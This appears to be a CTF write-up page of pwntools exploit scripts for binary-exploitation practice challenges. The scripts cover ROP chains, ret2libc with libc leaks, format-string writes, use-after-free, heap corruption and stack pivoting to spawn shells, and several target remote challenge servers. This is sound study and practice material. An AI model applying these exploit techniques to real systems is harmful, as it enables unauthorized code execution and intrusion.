# buuctf wp part1

[bin file](https://github.com/song-10/notes/tree/master/writeups)

## [BJDCTF 2nd]one_gadget

```python
from pwn import *
context.arch = 'amd64'

# there is libc, and the program will call a address,
# so just use the one gagdet as the program name,
# otherwise, the program will leak the printf's addr

# p = process('./one_gadget')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('node3.buuoj.cn',29879)
libc = ELF('./libc-2.29.so',checksec=False)

# one_gadgets = 0x45216
one_gadgets = 0x106ef8
# 0xe237f execve("/bin/sh", rcx, [rbp-0x70])
# constraints:
#   [rcx] == NULL || rcx == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xe2383 execve("/bin/sh", rcx, rdx)
# constraints:
#   [rcx] == NULL || rcx == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe2386 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0x106ef8 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

p.recvuntil("here is the gift for u:")
printf_addr = int(p.recvuntil('\n',drop=True),16)
log.success('printf_addr = %#x',printf_addr)

libc_base = printf_addr - libc.sym['printf']
one_gadgets_addr = libc_base + one_gadgets
log.info('one_gadget = %#x',one_gadgets_addr)

p.recvuntil("Give me your one gadget:")
p.sendline(str(one_gadgets_addr))
sleep(1)
p.interactive()
```

## [BJDCTF 2nd]r2t3

```python
from pwn import *
context.arch = 'i386'

p = process('./r2t3')
# p = remote('node3.buuoj.cn',26564)
elf = ELF('./r2t3',checksec=False)

backdoor = elf.sym['_dl_registery']

payload = 'A'*5 + '\0'*0x14 + p32(backdoor) # pass the check   v3 = strlen(s);  if ( v3 <= 3u || v3 > 8u )
# payload = payload.ljust(0x14,'B') + p32(backdoor)
p.send(payload)
sleep(1)
p.interactive()
```

## [BJDCTF 2nd]r2t4

```python
from pwn import *
context.arch='amd64'
# rewrite the stack_chk_fail@got to backdoor and read flag by format string vulnerability

# p = process('./r2t4')
p = remote('node3.buuoj.cn',27411)
elf = ELF('./r2t4',checksec=False)

# check = elf.sym['___stack_chk_fail']
backdoor = elf.sym['backdoor']
log.info('backdoor=%#x',backdoor)
payload = "a%" + str(backdoor-1) + "c%8$lln" + p64(0x0000000000601018) + 'A'*0x20

p.send(payload)
p.interactive()
```

## [BJDCTF 2nd]ydsneedgirlfriend2

```python
    from pwn import *
    context.arch='amd64'
    # context.log_level="DEBUG"

    # just get shell by uaf, and there is function which could get shell

    # p = process('./ydsneedgirlfriend2')
    p = remote('node3.buuoj.cn',26159)
    elf = ELF('./ydsneedgirlfriend2',checksec=False)

    backdoor = elf.sym['backdoor']

    def add(name,length):
        p.recvuntil("u choice :")
        p.send('1')
        p.recvuntil("Please input the length of her name:")
        p.send(str(length))
        p.recvuntil("Please tell me her name:")
        p.send(name)

    def dele(index):
        p.recvuntil("u choice :")
        p.send('2')
        p.recvuntil("Index :")
        p.send(str(index))

    def show(index):
        p.recvuntil("u choice :")
        p.send('3')
        p.recvuntil("Index :")
        p.send(str(index))

    def debug():
        gdb.attach(p)
        pause()

    add('AAAA',0x20)
    add('BBBB',0x20)
    # debug()
    dele(0)
    dele(1)
    add('C'*8+p64(backdoor),0x10)
    show(0)
    # debug()
    p.interactive()
```

## [HarekazeCTF2019]baby_rop

```python
from pwn import *
context.arch = 'amd64'

# there are function system and strings '/bin/sh', so just call the system and get shell

# p = process('./babyrop')
p = remote('node3.buuoj.cn',27218)
elf = ELF('./babyrop')

pop_rdi = 0x0000000000400683 # pop rdi ; ret

payload = 'A'*(0x10+8) + flat([pop_rdi, elf.sym['binsh'], elf.sym['system'], elf.sym['main']])
# p.recvuntil('What\'s your name?')
p.sendline(payload)
sleep(1)
p.interactive()
# path of flag: /home/babyrop/flag
```

## [HarekazeCTF2019]baby_rop2

```python
from pwn import *
from LibcSearcher import *
context.arch='amd64'

# p = process('./babyrop2')
p = remote('node3.buuoj.cn',25002)
elf = ELF('./babyrop2')

pop_rdi = 0x0000000000400733 # pop rdi ; ret

p.recvuntil("What's your name? ")
p.send('A'*0x28+flat([pop_rdi, elf.got['read'], elf.sym['printf'], elf.sym['main']]))
# leak the read addres, and calculate the libc address
p.recvuntil('\n')
read_addr = u64(p.recv(6).ljust(8,'\x00'))
log.success('read_addr = %#x',read_addr)

libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr, binsh_addr))

payload = 'A'*0x28 + flat([pop_rdi, binsh_addr, system_addr, elf.sym['main']])
p.recvuntil("What's your name? ")
p.send(payload)
sleep(1)
p.interactive()

# the path of flag: /home/babyrop2/flag
```

## [OGeek2019]babyrop

```python
from pwn import *
from LibcSearcher import *
context.arch = 'i386'

# p = process('./pwn')
p = remote('node3.buuoj.cn',27152)

payload = '\x00'    # strncmp will be stoped by character '\x00'
payload += 'a'*6 + p16(0xff)
# padding to the walue of funtion retn (eax),
# and make our input length under control

p.send(payload)
p.recv()

elf = ELF('./pwn')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x08048825

payload = 'A'*(235) + p32(puts_plt) + p32(main) + p32(puts_got)
# the offset need debugger to find
# leak the puts addr in menmory
p.send(payload)
puts_addr = u32(p.recvuntil('\n',drop=True))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr,binsh_addr))

payload = '\x00'    # strncmp will be stoped by character '\x00'
payload += 'a'*6 + p16(0xff)
p.send(payload)
p.recv()

payload = 'A'*(235) + p32(system_addr) + p32(main) + p32(binsh_addr)
p.send(payload)
sleep(1)
p.interactive()
```

## [ZJCTF 2019]Login

```python
from pwn import *
context.arch='amd64'
# it's a c++ program, it's difficult to read,
# but we still could find it will execve 'call rax' when check the pwd and usr,
# and the pwd,usr are in the program,
# otherwise, there is a function which can getshell,
# because the input is on the stack, we could change the value of rax to getshell by overwrite on stack

# p = process('./login')
p = remote('node3.buuoj.cn',28108)

# pwndbg> b *0x0000000000400DA6
# Breakpoint 1 at 0x400da2
# pwndbg> b *0x0000000000400A51
# Breakpoint 2 at 0x400a51
# pwndbg> r
# Starting program: /home/nop/Desktop/login
#  _____   _  ____ _____ _____   _                _
# |__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  
#   / /_  | | |     | | | |_    | |   / _ \ / _` | | '_ \
#  / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |
# /____\___/ \____| |_| |_|     |_____\___/ \__, |_|_| |_|
#                                           |___/
# Please enter username: admin
# Please enter password: 2jctf_pa5sw0rd
# ......
# pwndbg> x/x $rax
# 0x7fffffffdae0: 0x74636a32   <== password in stack
# pwndbg> c
# Continuing.
# Password accepted: Password accepted:
# ......
# 0x400a51    mov    rax, qword ptr [rax] <== rax iclude a addr which will be called
# 0x400a54    call   rax
# ......
# Breakpoint *0x0000000000400A51
# pwndbg> x/x $rax
# 0x7fffffffdb28: 0x004000b4


shell = 0x0000000000400E88  # function which in program could getshell
p.recvuntil('Please enter username:')
p.sendline('admin')
p.recvuntil('Please enter password:')
payload = '2jctf_pa5sw0rd'.ljust(0x7fffffffdb28-0x7fffffffdae0,'\x00') + p64(shell)
p.sendline(payload)
p.recvuntil("Password accepted")
p.interactive()
```

## [第五空间2019 决赛]PWN5

```python
from pwn import *
context.arch = 'i386'

# p = process('./pwn')
p = remote('node3.buuoj.cn',26421)

rand_num = 0x0804C044
payload = p32(rand_num) + '%10$n'
# cover the value of rand_num to 4 by format string vulnerability
# payload = fmtstr_payload(10,{0x0804C044:5})   # cover the value of rand_num to 5 by using func in pwntools
p.sendafter("your name:",payload)
p.sendafter("your passwd:",'4')
# transfer number 4 to pass the judgement
p.interactive()
```

## Asis CTF 2016 b00ks

```python
    from pwn import *
    context.log_level = 'info'

    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
    elf = ELF('./b00ks')

    def create(name, name_size, description, des_size):
        p.recvuntil('> ')
        p.sendline('1')
        p.recvuntil('Enter book name size: ')
        p.sendline(str(name_size))
        p.recvuntil("Enter book name (Max 32 chars): ")
        p.sendline(name)
        p.recvuntil("Enter book description size: ")
        p.sendline(str(des_size))
        p.recvuntil("Enter book description: ")
        p.sendline(description)

    def delete(id):
        p.recvuntil('> ')
        p.sendline('2')
        p.recvuntil("Enter the book id you want to delete: ")
        p.sendline(str(id))

    def edit(id, description):
        p.recvuntil('> ')
        p.sendline('3')
        p.recvuntil("Enter the book id you want to edit: ")
        p.sendline(str(id))
        p.recvuntil("Enter new book description: ")
        p.sendline(description)

    def print_book_detail(id):
        p.recvuntil('> ')
        p.sendline('4')
        dicts = {'id':[], 'name':[], 'description':[], 'author':[]}
        for i in range(id):
            try:
                p.recvuntil("ID: ",timeout=1)
                dicts['id'].append(int(p.recvuntil('\n',drop=True)))
                p.recvuntil('Name: ')
                dicts['name'].append(p.recvuntil('\n',drop=True))
                p.recvuntil('Description: ')
                dicts['description'].append(p.recvuntil('\n',drop=True))
                p.recvuntil('Author: ')
                dicts['author'].append(p.recvuntil('\n',drop=True))
            except:
                return dicts['id'],dicts['name'],dicts['description'],dicts['author']
        return dicts['id'],dicts['name'],dicts['description'],dicts['author']
    def change_auther_name(name):
        p.recvuntil('> ')
        p.sendline('5')
        p.recvuntil("Enter author name: ")
        p.sendline(name)

    def create_auhter_name(name):
        p.recvuntil("Enter author name: ")
        p.sendline(name)

    def debug():
        gdb.attach(p)
        pause()

    # create_auhter_name('A'*30)
    # create('a',10,'b',10)
    # debug()
    # pwndbg> search "AAAAA"
    # b00ks           0x55818f92b040 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
    # b00ks           0x55818f92b045 'AAAAAAAAAAAAAAAAAAAAAAAAA'
    # b00ks           0x55818f92b04a 'AAAAAAAAAAAAAAAAAAAA'
    # b00ks           0x55818f92b04f 'AAAAAAAAAAAAAAA'
    # b00ks           0x55818f92b054 'AAAAAAAAAA'
    # b00ks           0x55818f92b059 0x6000004141414141 /* 'AAAAA' */
    # warning: Unable to access 16000 bytes of target memory at 0x7f801f492d04, halting search.
    # pwndbg> x/16g 0x55818f92b040
    # 0x55818f92b040:   0x4141414141414141  0x4141414141414141
    # 0x55818f92b050:   0x4141414141414141  0x0000414141414141
    # 0x55818f92b060:   0x000055818f9bc060  0x0000000000000000

    p = process('./b00ks')
    # p = remote('node3.buuoj.cn',29670)
    create_auhter_name('A'*32)
    create('a', 0xd0, 'b', 32)
    # here need to calcculate the value(0xd0),need to make name's true size is 0xe0
    create('c',0x21000, 'd', 0x21000)

    book1_id, book1_name, book1_des, author = print_book_detail(1)
    library_book = u64(author[0][32:32+6].ljust(8,'\x00'))
    log.success('library_book = %#x',library_book)

    fake_book1 = p64(1)+ p64(library_book+0x38) + p64(library_book + 0x40) + pack(0xffff)
    # id,name,descripton,len(descritpion)
    edit(book1_id[0],fake_book1)
    change_auther_name('A'*32)
    # cover the library_book's lowest bytes to 0x00,and make it point to book1's descritption, and print our fake book1 to leak libc
    # debug()

    book2_id, book2_name, book2_des, author = print_book_detail(1)
    book2_name = u64(book2_name[0].ljust(8,'\x00'))
    book2_des = u64(book2_des[0].ljust(8,'\x00'))
    log.success('book2_name = %#x, book2_des = %#x'%(book2_name,book2_des))
    # debug()

    # 0x7fdc89c6f000-0x7fdc896e4000=0x58b000
    libc_base = book2_des - (0x58b000 + 0x10)
    free_hook = libc_base + libc.sym['__free_hook']
    system_addr = libc_base + libc.sym['system']
    binsh = libc_base + libc.search("/bin/sh").next()
    one_gadget = libc_base + 0x45216
    # execve("/bin/sh", rsp+0x30, environ)
    # constraints:
    #   rax == NULL
    log.info('libc_base = %#x, free_hook = %#x, one_gadget = %#x'%(libc_base,free_hook,one_gadget))

    # edit(1, p64(free_hook)*2)
    # edit(2, p64(one_gadget))
    payload = p64(binsh)+p64(free_hook)

    edit(1,payload)
    debug()
    edit(2,p64(system_addr))

    delete(2)
    p.interactive()
```

## bjdctf_2020_babyrop

```python
from pwn import *
from LibcSearcher import *
context.arch='amd64'

# p = process('./babyrop')
p = remote('node3.buuoj.cn',27480)
elf = ELF('./babyrop',checksec=False)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
pop_rdi = 0x0000000000400733 # pop rdi ; ret

payload = 'A'*(0x20+8)
payload += flat([pop_rdi, puts_got, puts_plt, main])
p.recvuntil("Pull up your sword and tell me u story!\n")
p.send(payload)

puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

payload = 'A'*(0x20+8)
payload += flat([pop_rdi, binsh, system_addr, main])
p.recvuntil('story!\n')
p.send(payload)
sleep(1)
p.interactive()
```

## bjdctf_2020_babystack

```python
from pwn import *
context.arch='amd64'

# p = process('./babystack')
p = remote('node3.buuoj.cn',29940)

p.recvuntil("[+]Please input the length of your name:")
p.sendline('32')
# make sure the length is enough to call backdoor by stack overflow

payload = 'A'*(0x10+8) + p64(ELF('./babystack',checksec=False).sym['backdoor'])
p.recvuntil('name?')
p.send(payload)
sleep(1)
p.interactive()
```

## Black Watch入群题

```python
from pwn import *
from LibcSearcher import *
context.arch='i386'

# the second read limit the length of inputs to 0x20, 
# we can't make satck overflow by this,
# but we cuold control ebp to a fake satck to getshell by satck pivot

# p = process('./spwn')
p = remote('node3.buuoj.cn',29180)
elf = ELF('./spwn',checksec=False)

fake_stack = 0x0804A300
leave_ret = 0x08048408

p.recvuntil('What is your name?')
# payload = flat(['aaaa',elf.sym['puts'], elf.sym['main'], elf.got['read']])
payload = flat(['aaaa', elf.sym['write'], elf.sym['main'], 1, elf.got['write'], 4])
# leak the libc
p.send(payload)

p.recvuntil('What do you want to say?')
payload = 'A'*0x18 + p32(fake_stack) + p32(leave_ret)
# stack pivot
p.send(payload)


write_addr = u32(p.recv(4))
log.success('write_addr = %#x',write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

p.recvuntil('What is your name?')
payload = flat(['aaaa', system_addr, elf.sym['main'], binsh])
p.send(payload)

p.recvuntil('What do you want to say?')
payload = 'A'*0x18 + p32(fake_stack) + p32(leave_ret)
p.send(payload)
sleep(1)
p.interactive()
```
